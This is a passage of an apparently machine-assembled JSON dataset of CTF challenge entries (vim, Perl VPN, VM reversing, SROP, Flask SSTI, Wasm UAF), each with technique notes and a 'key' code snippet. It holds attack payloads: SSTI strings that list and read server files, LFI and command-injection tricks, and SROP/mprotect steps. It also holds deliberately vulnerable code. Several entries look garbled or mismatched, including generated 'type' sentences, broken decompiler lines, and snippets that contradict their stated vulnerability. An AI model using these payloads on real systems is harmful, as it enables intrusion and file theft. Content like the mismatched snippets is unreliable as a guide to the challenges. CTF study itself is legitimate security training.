        "knowledge": [
            "When faced with a complex vim script challenge, breaking down the script into smaller, manageable segments can make the task more manageable. This approach enables a step-by-step analysis of the script's functionality. Using simpler or well-understood scripts as a basis, one can emulate a form of dynamic analysis by simulating the execution flow of the original script.",
            "Converting a vim script into a more familiar programming language, such as Python, can aid in understanding and solving the challenge, especially if direct analysis of the script is difficult due to complexity or lack of familiarity with vim scripting. This method allows leveraging existing programming knowledge and tools to analyze the scripts\u2019 logic and behavior.\n\nExample translation process (from vim script to Python code):\n- Identify vim script commands and their Python equivalents.\n- Translate vim variables and functions into Python variables and functions.\n- Simulate vim script execution flow in Python, ensuring logical structures (e.g., loops, conditionals) are correctly implemented.\n\n(Note: Due to the abstract nature of the translation process, a specific code sample is not provided. The approach involves general programming and problem-solving skills rather than executing a specific payload.)"
        ],
        "key": "```vim\n\" Possible vulnerable code snippet in task.vim\nfunction! ExecuteCommand(cmd)\n  execute a:cmd\nendfunction\n\n\" Usage\ncall ExecuteCommand(\"!ls\")\n```\n\nThis code snippet demonstrates a potential vulnerability where user input could be executed as a shell command, leading to command injection if not properly sanitized."
    },
    {
        "name": "Virtual Private Network",
        "write_up": "dataset/raw/Virtual Private Network.md",
        "type": "web",
        "competition": [
            "HITCON/2019/Quals",
            "https://ctftime.org/event/848/tasks/"
        ],
        "score": 183,
        "max_score": 500,
        "difficulty": 0.366,
        "knowledge": [
            "When facing a Perl-based web application that includes files based on a parameter, check for directory traversal prevention mechanisms. If the inclusion only checks for the presence of \"..\" to prevent traversal but does not account for absolute paths or other forms of referencing files outside the intended directory, it may be vulnerable to Local File Inclusion (LFI). In such cases, providing a crafted filename as a parameter can lead to arbitrary file inclusion.\n   - Example: If the application concatenates a base directory with user input to include files (e.g., \"./tmp/\" + user_input + \".thtml\"), and only checks for \"..\" in the user input, you can leverage this to include arbitrary files located within allowed directories by crafting the input parameter appropriately, avoiding the use of \"..\".",
            "For command injection vulnerabilities, especially in scenarios where the application's error messages can execute as code (such as with Perl's 'require' function), using stderr redirection can force the application to process the error message as code. This technique is exemplified in CVE-2019-11539 where a command injection into `tcpdump` can be achieved. Tools or functions that generate error messages containing user-controlled input present a unique vector for command injection. Crafting input that results in an error message structurally valid as code, along with stderr redirection, can lead to arbitrary command execution.\n   - Example payload to exploit stderr redirection in command injection: `print 123#`. This input, when passed as a filename to `tcpdump` in an environment where stderr is processed as Perl code, would execute as `print 123`, effectively injecting commands."
        ],
        "key": "```perl  \nsub tcpdump_options_syntax_check {  \n   my $options = shift;  \n   return $options if system(\"timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1\") == 0;  \n   return undef;  \n}  \n  \n# backdoor :)  \nmy $tpl = CGI::param(\"tpl\");  \nif (length $tpl > 0 && index($tpl, \"..\") == -1) {  \n   $tpl = \"./tmp/\" . $tpl . \".thtml\";  \n   require($tpl);  \n}  \n```"
    },
    {
        "name": "VirtualJava",
        "write_up": "dataset/raw/VirtualJava.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": 357,
        "max_score": 500,
        "difficulty": 0.714,
        "knowledge": [
            "In challenges involving virtual machines or custom interpreters executing assembly-like code, brute-forcing the input character by character based on expected output can be an effective strategy. This approach works well when the code processes input sequentially and checks each character against a set of conditions. It requires modifying or creating a script that iterates through all printable ASCII characters for each position, checking the validity of the output at each step, and if the output matches the expected criteria (not equal to an error state), then the character is considered part of the solution.\n   - Example payload modification snippet: \n     ```java\n     String ans = \"\";\n     for (int i = 32; i < 127; ++i){\n         String aa = Character.toString((char)i);  \n         String a = ans + aa;  \n         ...  \n         boolean right=true;  \n         for (int j = 0; j < c.length; j++) {  \n             String s = getOutput(Math.abs(java.run(j, (int) c[j])));  \n             if (s.equals(\"errorState\")) {  \n                 right = false;  \n                 break;  \n             }  \n         }  \n         if (right == true){  \n             ans = ans + aa;  \n         }  \n     }\n     ```",
            "When reversing or decoding the logic of a custom implementation such as a virtual machine or interpreter, automated tools or scripts that mimic the interpreter's logic but provide debugging or output checking capabilities can significantly reduce the complexity and time required. This method relies on understanding the intended operation of the interpreter to a sufficient degree, allowing the creation of a script that simulates the execution path of inputs to identify the correct sequence that produces a particular outcome.\n   - Note: This point does not lend itself to a singular example payload due to the nature of the challenge being heavily dependent on the specific implementation of the interpreter or virtual machine."
        ],
        "key": "```java\npublic class VirtualJava {\n    private int[] memory;\n    private int pointer;\n\n    public VirtualJava() {\n        memory = new int[256];\n        pointer = 0;\n    }\n\n    public void execute(String code) {\n        for (char command : code.toCharArray()) {\n            switch (command) {\n                case '>':\n                    pointer = (pointer + 1) % memory.length;\n                    break;\n                case '<':\n                    pointer = (pointer - 1 + memory.length) % memory.length;\n                    break;\n                case '+':\n                    memory[pointer] = (memory[pointer] + 1) % 256;\n                    break;\n                case '-':\n                    memory[pointer] = (memory[pointer] - 1 + 256) % 256;\n                    break;\n                case '.':\n                    System.out.print((char) memory[pointer]);\n                    break;\n                case ',':\n                    // Assume input is provided somehow\n                    break;\n                default:\n                    // Ignore other characters\n                    break;\n            }\n        }\n    }\n}\n```"
    },
    {
        "name": "vm-v2",
        "write_up": "dataset/raw/vm-v2.md",
        "type": "reverse",
        "competition": [
            "MapleCTF/2022",
            "https://ctftime.org/event/1676/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In challenges involving custom CPU architectures, a thorough understanding of the architecture and instruction set is crucial. One can start by de-obfuscating and understanding the SystemVerilog (or Verilog) code provided to grasp the CPU's design. This involves identifying stack operations, ALU instructions, and architectural specifics like separate program and data memory (Harvard architecture) or the lack of general-purpose registers (stack-based architecture). De-obfuscation can be approached similarly to reverse engineering any software program, by renaming obfuscated identifiers to meaningful names for better clarity.",
            "If a challenge exhibits a side-channel vulnerability where the program's output or behavior depends on input correctness (such as the total number of executed instructions varying with correct vs. incorrect inputs), a brute-force attack can be effective. This technique particularly applies when verifying inputs incrementally impacts the execution path or instruction count. Develop a script to automate input trials, observing changes in the program's execution metrics (like instruction count) to deduce correct values progressively. \n\n   Python pseudocode example for a brute-force attack leveraging a side-channel vulnerability based on instruction count:\n   ```python\n   best_inscount = initial_run_instruction_count\n   brute_pos = start_of_input_address_in_memory\n   flag = \"\"\n   improved = True\n\n   while improved:\n       improved = False\n       for possible_character in range(0x20, 0x7f): # ASCII printable characters\n           data[brute_pos] = possible_character\n           reset_and_load_cpu_state(cpu, data)\n           instruction_count_after_run = execute_program(cpu)\n           if instruction_count_after_run > best_inscount:\n               flag += chr(possible_character)\n               brute_pos += 1\n               best_inscount = instruction_count_after_run\n               improved = True\n               break\n   print(f\"Extracted flag: {flag}\")\n   ```"
        ],
        "key": "```systemverilog\nmodule Ol8vW(eo3,nF3,QU6cTlk,Jpup6gEow,nFOoEI7Dnl,QV,pb);  \n   input eo3,nF3,pb;\n\n   input [7:0] QU6cTlk;  \n   output [7:0] Jpup6gEow,nFOoEI7Dnl;  \n   input [2:0] QV;\n\n   parameter WXifi4fqUy9NY = 16;  \n   logic [7:0] fgS [2**WXifi4fqUy9NY-1:0];  \n   logic [WXifi4fqUy9NY-1:0] gPrDVGD;\n\n   always_ff @(posedge eo3) begin  \n```\n"
    },
    {
        "name": "vmlog",
        "write_up": "dataset/raw/vmlog.md",
        "type": "The type of this CTF challenge is probably **reverse**.",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 213,
        "max_score": 755,
        "difficulty": 0.28211920529801326,
        "knowledge": [
            "When dealing with VM (Virtual Machine) based CTF challenges that require understanding or interacting with custom programming logic, one effective strategy is to instrument the provided VM code to simulate execution and track its state based on input. This allows for a controlled environment where specific behaviors can be observed and manipulated. For example, modifying the VM code to accept input from a predefined array and to yield memory state after each step can greatly facilitate reverse engineering efforts by enabling automated testing of inputs and direct observation of changes in memory. Such modifications enable a brute-force approach to discovering inputs (like flags) by comparing expected memory states with actual ones after execution. This is particularly useful when dealing with obfuscated or complex VMs where understanding every operation is impractical.",
            "For brute-forcing flags or specific values in VM-based challenges where the correct input leads to a known memory state, create a script that tests all possible inputs in a systematic manner (e.g., byte by byte) and monitors the VM's memory state after each input. By comparing the actual memory state with the expected one after each input, the correct flag or values can be incrementally discovered without full comprehension of the VM's internal workings. This method hinges on the ability to accurately simulate or run the VM with modified control of inputs and a mechanism to read memory states, requiring direct manipulation of the provided VM code.\n\nExample payload generation approach:\n\n```python\nio_array = [None] * expected_input_length  # Predefine the length of flag or input\nfor index in range(len(io_array)):\n    for char in range(256):  # Test all possible ASCII characters\n        io_array[index] = chr(char)\n        mem_state = vm_run(program, io_array)\n        if mem_state == expected_memory_state:\n            print(f\"Found character at position {index}: {chr(char)}\")\n            break  # Move to next character once matching state is found\n```"
        ],
        "key": "```python\ndef vm_run(program, io):  \n   io_idx = 0  \n   reg = 0  \n   mem = [0 for _ in range(10)]  \n   p = 0  \n   pc = 0  \n   buf = \"\"  \n   while pc < len(program):  \n       op = program[pc]  \n       if op == \"+\":  \n           reg += 1  \n       elif op == \"-\":  \n           reg -= 1  \n       elif op == \"*\":  \n           reg *= mem[p]  \n       elif op == \"%\":  \n           reg = mem[p] % reg  \n       elif op == \"l\":  \n           reg = mem[p]  \n       elif op == \"s\":  \n           mem[p] = reg  \n       elif op == \">\":  \n           p = (p + 1) % 10  \n       elif op == \"<\":  \n           p = (p - 1) % 10  \n       elif op == \",\":  \n           a = io[io_idx]  \n           io_idx += 1  \n           if not a:  \n               reg = 0  \n           else:  \n               reg += ord(a)  \n       elif op == \"p\":  \n           buf += str(reg)  \n       elif op == \"[\":  \n           if reg == 0:  \n               cnt = 1  \n               while cnt != 0:  \n                   pc += 1  \n                   if program[pc] == \"[\":  \n                       cnt += 1  \n                   if program[pc] == \"]\":  \n                       cnt -= 1  \n       elif op == \"]\":  \n           if reg != 0:  \n               cnt = 1  \n               while cnt != 0:  \n                   pc -= 1  \n                   if program[pc] == \"[\":  \n                       cnt -= 1  \n                   if program[pc] == \"]\":  \n                       cnt += 1  \n       elif op == \"M\":  \n           # print(mem)  \n           yield mem  \n       pc += 1  \n   print(buf)\n```"
    },
    {
        "name": "vmwhere2",
        "write_up": "dataset/raw/vmwhere2.md",
        "type": "reverse",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When faced with a VM-based reverse engineering challenge, one effective approach is to decompile the VM instructions and reconstruct the logic of the program. This can be particularly useful when the program involves transformations based on stack operations, such as reversing the stack, translating binary representations to numeric values, or performing bitwise operations (e.g., XOR) on input values. By understanding these operations, one can reverse engineer the application's logic to deduce the required input (e.g., a flag).",
            "For challenges where a program breaks after each incorrect input character, simulating a timing attack can be beneficial. This can be accomplished by measuring the execution time or the number of function calls for each input character using tools like `valgrind --tool=callgrind`. The idea is to iteratively choose the input that results in the longest execution time or the highest number of function calls, indicating that more of the program code is being executed, and thus getting closer to the correct input. This method applies well to VM challenges or any challenge design that incrementally validates input.\n\n    Example usage: `valgrind --tool=callgrind ./chal input_character`\n    A script that automates this process could execute the target application with each possible input character and measure the call counts to determine which character progresses further in the validation process, thereby narrowing down the correct input one character at a time."
        ],
        "key": "```c\nvoid execute_program() {\n    int stack[256];\n    int sp = 0; // stack pointer\n\n    // Program instructions\n    stack[sp++] = 0;   // push 0\n    stack[sp++] = 10;  // push 10\n    stack[sp++] = 33;  // push 33\n    stack[sp++] = 116; // push 116\n    stack[sp++] = 99;  // push 99\n    stack[sp++] = 101; // push 101\n    stack[sp++] = 114; // push 114\n    stack[sp++] = 114; // push 114\n    stack[sp++] = 111; // push 111\n    stack[sp++] = 67;  // push 67\n\n    while (1) {\n        if (stack[sp - 1] == 0) {\n            break; // jump to 3003\n        }\n        printf(\"%c\", stack[--sp]); // print(pop())\n    }\n}\n```"
    },
    {
        "name": "void",
        "write_up": "dataset/raw/void.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2022",
            "https://ctftime.org/event/1557/tasks/"
        ],
        "score": 272,
        "max_score": 500,
        "difficulty": 0.544,
        "knowledge": [
            "When facing a scenario where direct writing to the `rax` register is not possible, and there's a need to control `rax` for syscall execution, using a `sys_read` call can be a practical workaround. By reading a specific amount of bytes, the value of `rax` can be indirectly set to the desired syscall number. For instance, to set `rax` to 0xf (`sys_rt_sigreturn` on x86_64), one could perform a read operation of 15 bytes. This technique is useful when constructing a syscall or SROP-based exploit where direct control over `rax` is necessary but not directly achievable. Example payload segment: `chain=p64(syscall_ret).ljust(constants.SYS_rt_sigreturn)`",
            "SROP (Sigreturn Oriented Programming) can be effectively used to bypass restrictions or limitations in exploit development, especially when gadget constraints make conventional ROP difficult. By manipulating the stack to include a `SigreturnFrame`, an attacker can control the state of the processor, including register values and the instruction pointer, upon executing a `sigreturn` syscall. This can be particularly useful for calling functions like `mprotect` to change memory permissions when needed, such as making a region executable for shellcode. Example technique: Construct a SigreturnFrame with desired register values (e.g., `frame.rax = constants.SYS_mprotect`, `frame.rdi = start_address`, `frame.rsi = length`, `frame.rdx = 7 (RWX permissions)`) and send it as part of the payload to execute `mprotect` via SROP."
        ],
        "key": "```c\n#include <unistd.h>\n#include <sys/mman.h>\n#include <signal.h>\n\nvoid vulnerable_function() {\n    char buffer[128];\n    read(0, buffer, 256); // Buffer overflow vulnerability\n}\n\nvoid setup() {\n    mprotect((void *)0x400000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC); // RWX permissions\n    signal(SIGSEGV, SIG_IGN); // Ignore segmentation faults\n}\n\nint main() {\n    setup();\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "W",
        "write_up": "dataset/raw/W.md",
        "type": "reverse",
        "competition": [
            "0CTF/2020/Quals",
            "https://ctftime.org/event/1026/tasks/"
        ],
        "score": 523,
        "max_score": 846,
        "difficulty": 0.6182033096926713,
        "knowledge": [
            "When reversing WebAssembly (wasm) binaries, it is possible to decompile the binary using tools like ReWasm and JEB Pro for analysis. This process can reveal critical functions and the flow of program execution, useful for understanding underlying algorithms or uncovering vulnerabilities. Tools for decompilation enable renaming and clearer interpretation of function calls and logic structures.",
            "In scenarios involving known plaintext attacks against encoded or encrypted data within a binary, leveraging the presence of a specific plaintext string can facilitate the decryption or decoding process. By identifying and reverse-engineering the encoding or encryption routine (as demonstrated with the unpacking routine), one can retrieve the original input necessary to reproduce the expected decrypted output. Such an approach often involves crafting an inverse algorithm or using brute-force techniques to solve linear equations or other mathematical conditions imposed by the binary's logic.\n\nExample of crafting an inverse algorithm in Python for the unpacking routine:\n```python\ndef unpack(buf, buflen, secret):  \n   for i in range(0, buflen >> 9):  \n       a = 255  \n       for j in range(512):  \n           b = ord(secret[j & 0x1F]) ^ a ^ buf[i*512 + j]  \n           a = buf[i*512 + j]\n           buf[i*512 + j] = (b - (j & 0x1F)) & 0xFF\n   return buf\n```\n\nThis approach underscores the effectiveness of reverse engineering and cryptographic analysis in solving challenges that involve decoding or decrypting data within binaries, particularly in CTF contests and security research."
        ],
        "key": "```c\nvoid unpack__f42(int par0, int par1, int par2) {  \n   // Decompilation error  \n}\n\n```\n\n```c\n// Function 42  \nfn unpack(i32 arg_0, i32 arg_1, i32 arg_2) {  \n   var_3 = 0;  \n   /* ... */  \n   var_42 = 0;  \n   var_43 = global_0 - 48;  \n   store<i32>(var_43 + 44, arg_0)                      // buf  \n   gl0_b = global_0 - 48;  \n   store<i32>(gl0_b + 40, arg_1)                       // buflen = 0x5200  \n   gl0_c = global_0 - 48;  \n   store<i32>(gl0_c + 36, arg_2)                       // flag  \n   gl0_d = global_0 - 48;  \n   var_47 = load<i32>(gl0_d + 40);                     // g40 = buflen  \n   if (var_47 & 511) == 0 {                            // 0x5200 & 0x1FF == 0\n? yes!  \n       gl0_e = global_0 - 48;  \n       var_49 = load<i32>(gl0_e + 40);                 // g40 = buflen  \n       gl0_e = global_0 - 48;  \n       var_51 = var_49 >>u 9;                          // buflen >> 9  \n       store<i32>(gl0_e + 32, var_51)                  // g32 = buflen >> 9  \n       gl0_g = global_0 - 48;  \n       var_53 = load<i32>(gl0_g + 44);  \n       gl0_h = global_0 - 48;  \n       store<i32>(gl0_h + 28, var_53)                  // g28 = buf  \n       gl0_i = global_0 - 48;  \n       store<i32>(gl0_i + 24, 0)                       // g24 = i = 0  \n       while true {  \n           gl0_j = global_0 - 48;  \n           var_57 = load<i32>(gl0_j + 24);             // i  \n           gl0_k = global_0 - 48;  \n           var_59 = load<i32>(gl0_k + 32);             // buflen >> 9  \n           var_60 = var_57 _> 9) ?  \n           if var_60 == 0 {  \n               break;                                  // if not break  \n           }  \n           gl0_l = global_0 - 48;  \n           store_8<i32>(gl0_l + 23, 255)               // g23 = 255 = a  \n           gl0_m = global_0 - 48;  \n           store<i32>(gl0_m + 16, 0)                   // g16 = j = 0  \n           while true {  \n               gl0_n = global_0 - 48;  \n               var_64 = load<i32>(gl0_n + 16);         // g16 = j  \n               var_65 = var_64 _(gl0_o + 16);         // j  \n               var_3 = var_67;  \n               var_4 = 31;  \n               var_5 = var_67 & 31;  \n               gl0_p = global_0 - 48;  \n               var_69 = var_67 & 31;  \n               store_8<i32>(gl0_p + 15, var_69)        // g15 = j & 0x1F  \n               gl0_q = global_0 - 48;  \n               var_71 = load<i32>(gl0_q + 36);         // g36 = flag  \n               var_6 = var_71;  \n               gl0_r = global_0 - 48;  \n               var_73 = load_8u<i32>(gl0_r + 15);      // g15 = j & 0x1F  \n               var_7 = var_73;  \n               var_8 = 255;  \n               var_9 = var_73 & 255;  \n               var_10 = var_71 + (var_73 & 255);       // & flag + (j & 0x1F)  \n               var_74 = load_8u<i32>(var_10);          // f = flag[j & 0x1F]  => Flag is 31 characters!  \n               var_11 = var_74;  \n               var_12 = 255;  \n               var_13 = var_74 & 255;  \n               gl0_s = global_0 - 48;  \n               var_76 = load_8u<i32>(gl0_s + 23);      // g23 = a  \n               var_14 = var_76;  \n               var_15 = 24;  \n               var_16 = var_76 << 24;  \n               var_17 = var_76 << 24 >>s 24;           // (a << 24) >> 24 ? ~> a  \n               var_18 = var_74 & 255 ^ var_17;         // flag[j & 0x1F] ^ a  \n               gl0_t = global_0 - 48;  \n               var_78 = load<i32>(gl0_t + 28);         // g28 = buf  \n               var_19 = var_78;  \n               gl0_u = global_0 - 48;  \n               var_80 = load<i32>(gl0_u + 16);         // g16 = j  \n               var_20 = var_80;  \n               var_21 = var_78 + var_80;  \n               var_81 = load_8u<i32>(var_78 + var_80); // buf[j]  \n               var_22 = var_81;  \n               var_23 = 255;  \n               var_24 = var_81 & 255;  \n               var_25 = var_18 ^ var_81 & 255;         // flag[j & 0x1F] ^ a ^ buf[j]  \n               gl0_v = global_0 - 48;  \n               store_8<i32>(gl0_v + 14, var_25)        // g14 = flag[j & 0x1F] ^ a ^ buf[j]  \n               gl0_w = global_0 - 48;  \n               var_84 = load<i32>(gl0_w + 28);         // g28 = buf  \n               var_26 = var_84;  \n               gl0_x = global_0 - 48;  \n               var_86 = load<i32>(gl0_x + 16);         // g16 = i  \n               var_27 = var_86;  \n               var_28 = var_84 + var_86;  \n               var_87 = load_8u<i32>(var_84 + var_86); // buf[j]  \n               var_29 = var_87;  \n               gl0_y = global_0 - 48;  \n               store_8<i32>(gl0_y + 23, var_87)        // g23 = a = buf[j]  \n               gl0_z = global_0 - 48;  \n               var_90 = load_8u<i32>(gl0_z + 14);      // g14 = flag[j & 0x1F] ^ a ^ buf[j]  \n               var_30 = var_90;  \n               var_31 = 255;  \n               var_32 = var_90 & 255;  \n               gl0_aa = global_0 - 48;  \n               var_92 = load_8u<i32>(gl0_aa + 15);     // g15 = j & 0x1F  \n               var_33 = var_92;  \n               var_34 = 255;  \n               var_35 = var_92 & 255;  \n               var_93 = var_92 & 255;  \n               var_36 = (var_90 & 255) - var_93;       // flag[j & 0x1F] ^ a ^ buf[j] - (j & 0x1F)  \n               gl0_ab = global_0 - 48;  \n               var_95 = load<i32>(gl0_ab + 28);        // g28 = buf  \n               var_37 = var_95;  \n               gl0_ac = global_0 - 48;  \n               var_97 = load<i32>(gl0_ac + 16);        // g16 = j  \n               var_38 = var_97;  \n               var_39 = var_95 + var_97;  \n               store_8<i32>(var_95 + var_97, var_36)   // buf[j] = flag[j & 0x1F] ^ a ^ buf[j] - (j & 0x1F)  \n               gl0_ad = global_0 - 48;  \n               var_99 = load<i32>(gl0_ad + 16);        // g16 = j  \n               var_40 = var_99;  \n               var_41 = 1;  \n               var_42 = var_99 + 1;                    // j + 1  \n               gl0_ae = global_0 - 48;  \n               var_101 = var_99 + 1;  \n               store<i32>(gl0_ae + 16, var_101)        // g16 = j = j + 1 (++j)  \n           }  \n           var_102 = global_0 - 48;  \n           var_103 = load<i32>(var_102 + 28);          // g28 = buf  \n           var_104 = global_0 - 48;  \n           var_105 = var_103 + 512;  \n           store<i32>(var_104 + 28, var_105)           // g28 = buf = buf + 512 (move on the next chunk)  \n           var_106 = global_0 - 48;  \n           var_107 = load<i32>(var_106 + 24);          // g24 = i = outer iterator  \n           var_108 = global_0 - 48;  \n           var_109 = var_107 + 1;                      // ++i  \n           store<i32>(var_108 + 24, var_109)           // g24 = i + 1  \n       }  \n   }  \n   return;  \n}  \n```"
    },
    {
        "name": "wanky mail",
        "write_up": "dataset/raw/wanky mail.md",
        "type": "The type of this CTF challenge is a `web` challenge.",
        "competition": [
            "KITCTFCTF/2023",
            "https://ctftime.org/event/1965/tasks/"
        ],
        "score": 156,
        "max_score": 1000,
        "difficulty": 0.156,
        "knowledge": [
            "In Flask applications that utilize the `render_template_string` function, a server-side template injection (SSTI) vulnerability may occur if user input is included in the rendered templates without proper sanitation. This can lead to arbitrary code execution. To exploit such vulnerabilities, one can inject template syntax used by the server's templating engine (e.g., Jinja2 for Flask) into inputs that are rendered by the server. If the application attempts to escape user input by wrapping it in some sort of escaping function like `esc(s: str)` above, attackers can still break out of the escaping context using the templating engine's own syntax. A sample payload to list directories or read files if the application is vulnerable to this attack would look like this:  \nPayload to list files: `{% endraw %}{{ get_flashed_messages.__globals__.__builtins__.__import__('os').listdir() }}{% raw %}`  \nPayload to read file contents: `{% endraw %}{{ get_flashed_messages.__globals__.__builtins__.open(\"filename.txt\").read() }}{% raw %}`",
            "Proper email input and output handling in web applications is crucial to prevent XSS, SSRF, and information leaking through email functionalities. However, the use of a queue to manage active email addresses or sessions, as shown, introduces potential for denial of service or loss of email data if an attacker floods the service with email addresses, causing legitimate email data to be evicted from the queue. This highlights the need for comprehensive input validation, rate limiting, and consideration for data retention policies to safeguard against abuse. A preventive approach could include implementing captcha or other rate-limiting measures that prevent automated scripts from flooding the system with requests."
        ],
        "key": "```python\ndef esc(s: str):  \n   return \"{% raw %}\" + s + \"{% endraw %}\"\n```"
    },
    {
        "name": "warmup-rev",
        "write_up": "dataset/raw/warmup-rev.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 371,
        "max_score": 493,
        "difficulty": 0.7525354969574036,
        "knowledge": [
            "In challenges involving string manipulation functions, particularly when the functionality is described explicitly (e.g., character shifting or swapping), reversing the process can be achieved by inversing the operations. This method is applicable when functions modify string characters in a deterministic manner. \n   - For character shifting (e.g., adding a constant to character codes), reverse the operation by subtracting the same constant.\n   - For swapping parts of strings, reverse the process by correctly identifying the indices for re-swapping.\n   - Example reversal operation when \"+\" is used to manipulate characters: replace \"+\" with \"-\" to reverse the process.",
            "When the challenge involves multiple layers of encryption or manipulation functions, and analytical reversing is complex or impractical due to unknown variable values (e.g., indices after passing through functions), using a brute force approach to test all possible combinations can identify the correct sequence to reverse the manipulation.\n   - Particularly useful for reversing custom encryption or manipulation where part of the algorithm's specifics (like specific character positions) are not straightforward to deduce after transformations.\n   - Example approach for brute forcing indices in a reverse function: iterate over possible index ranges and apply the reversed operations, searching the outputs for recognizable patterns or the correct flag format."
        ],
        "key": "```java\npublic static void main(String[] args) {  \n\tScanner in = new Scanner(System.in);  \n\tSystem.out.print(\"Let's get warmed up! Please enter the flag: \");  \n\tString flag = in.nextLine();  \n\tString match = \"4n_3nd0th3rm1c_rxn_4b50rb5_3n3rgy\";  \n\tif (flag.length() == 33 && hot(warm(cool(cold(flag)))).equals(match))  \n\t\tSystem.out.println(\"You got it!\");  \n\telse  \n\t\tSystem.out.println(\"That's not correct, please try again!\");  \n\tin.close();  \n}  \n\npublic static String hot(String t) {\n\tString s = \"\";\n\tint[] adj = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33};\n\tfor (int i = 0; i < t.length(); i++) {\n\t\ts += (char) (t.charAt(i) + adj[i]);\n\t}\n\treturn s;\n}\n\npublic static String cool(String t) {\n\tString s = \"\";\n\tfor (int i = 0; i < t.length(); i++) {\n\t\ts += (char) (t.charAt(i) + 3 * (i / 2));\n\t}\n\treturn s;\n}\n\npublic static String cold(String t) {\n\treturn t.substring(17) + t.substring(0, 17);\n}\n\npublic static String warm(String t) {\n\tint firstL = t.indexOf('l');\n\tint secondL = t.indexOf('l', firstL + 1);\n\tString a = t.substring(0, firstL + 1);\n\tString t1 = t.substring(firstL + 1);\n\tString b = t1.substring(0, secondL - firstL);\n\tString c = t1.substring(secondL - firstL);\n\treturn c + b + a;\n}\n```"
    },
    {
        "name": "Wasm Notetaker",
        "write_up": "dataset/raw/Wasm Notetaker.md",
        "type": "pwn",
        "competition": [
            "BCACTF/2022",
            "https://ctftime.org/event/1602/tasks/"
        ],
        "score": 350,
        "max_score": 350,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving Use After Free (UAF) vulnerabilities in WebAssembly (Wasm) environments, particularly those utilizing the Emscripten compiler and dynamic memory allocation via malloc and free, exploit the vulnerability by first allocating a memory chunk, freeing it, and then manipulating the freed chunk to overwrite pointers or data. This method can be used to alter program execution flow or access restricted areas of memory. \n   - Sample exploitation steps: \n     1. Allocate a chunk of memory (`_malloc`). \n     2. Free the chunk (`_free`). \n     3. Overwrite the freed chunk's data or pointers to influence future allocations or program behavior.",
            "When exploiting Use After Free vulnerabilities, use arithmetic on pointers and data within the Wasm heap to position your payload such that it modifies specific target addresses or values. Especially in an environment like Wasm, where the memory layout can be deterministic, calculate the target address for your payload based on known offsets and structure sizes to achieve desired effects such as arbitrary write or code execution.\n   - Example technique to modify a specific address: After freeing a chunk, write into its place a pointer or value that will be used by the program to overwrite a targeted address or variable. Adjust the payload to accommodate for any alignment or offset requirements specific to the Wasm environment or memory management implementation."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define MAX_NOTES 8\n#define NOTE_SIZE 256\n\nchar* notes[MAX_NOTES];\n\nvoid create_note() {\n    int index;\n    printf(\"Please choose a note (1 to 8 inclusive)\\n\");\n    scanf(\"%d\", &index);\n    if (index < 1 || index > MAX_NOTES) {\n        printf(\"Invalid note index! Index must be from 1 to 8 (inclusive)\\n\");\n        return;\n    }\n    index--; // Adjust for 0-based index\n    if (notes[index] != NULL) {\n        printf(\"Note already exists!\\n\");\n        return;\n    }\n    notes[index] = (char*)malloc(NOTE_SIZE);\n    if (notes[index] == NULL) {\n        printf(\"No space for note? Exitting.\\n\");\n        exit(1);\n    }\n    printf(\"Note has been created\\n\");\n}\n\nvoid delete_note() {\n    int index;\n    printf(\"Please choose a note (1 to 8 inclusive)\\n\");\n    scanf(\"%d\", &index);\n    if (index < 1 || index > MAX_NOTES) {\n        printf(\"Invalid note index! Index must be from 1 to 8 (inclusive)\\n\");\n        return;\n    }\n    index--; // Adjust for 0-based index\n    if (notes[index] == NULL) {\n        printf(\"Note does not exist!\\n\");\n        return;\n    }\n    free(notes[index]);\n    notes[index] = NULL;\n    printf(\"Note has been deleted\\n\");\n}\n\nvoid write_note() {\n    int index;\n    printf(\"Please choose a note (1 to 8 inclusive)\\n\");\n    scanf(\"%d\", &index);\n    if (index < 1 || index > MAX_NOTES) {\n        printf(\"Invalid note index! Index must be from 1 to 8 (inclusive)\\n\");\n        return;\n    }\n    index--; // Adjust for 0-based index\n    if (notes[index] == NULL) {\n        printf(\"Note does not exist!\\n\");\n        return;\n    }\n    printf(\"Send note content for note #%d\\n\", index + 1);\n    scanf(\"%s\", notes[index]); // Potential buffer overflow\n    printf(\"Note has been written\\n\");\n}\n\nint main() {\n    int choice;\n    while (1) {\n        printf(\"]=======[ MENU ]=======[\\n\");\n        printf(\"] 1) Print a note      [\\n\");\n        printf(\"] 2) Delete note       [\\n\");\n        printf(\"] 3) Create a note     [\\n\");\n        printf(\"] 4) Write to a note   [\\n\");\n        printf(\"]======================[\\n\");\n        printf(\"Please choose an option (1, 2, 3, 4)\\n\");\n        scanf(\"%d\", &choice);\n        switch (choice) {\n            case 1:\n                // Print note functionality\n                break;\n            case 2:\n                delete_note();\n                break;\n            case 3:\n                create_note();\n                break;\n            case 4:\n                write_note();\n                break;\n            default:\n                printf(\"Invalid option!\\n\");\n                break;\n        }\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "WawaCoin",
        "write_up": "dataset/raw/WawaCoin.md",
        "type": "crypto",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 400,
        "max_score": 600,
        "difficulty": 0.6666666666666666,
        "knowledge": [
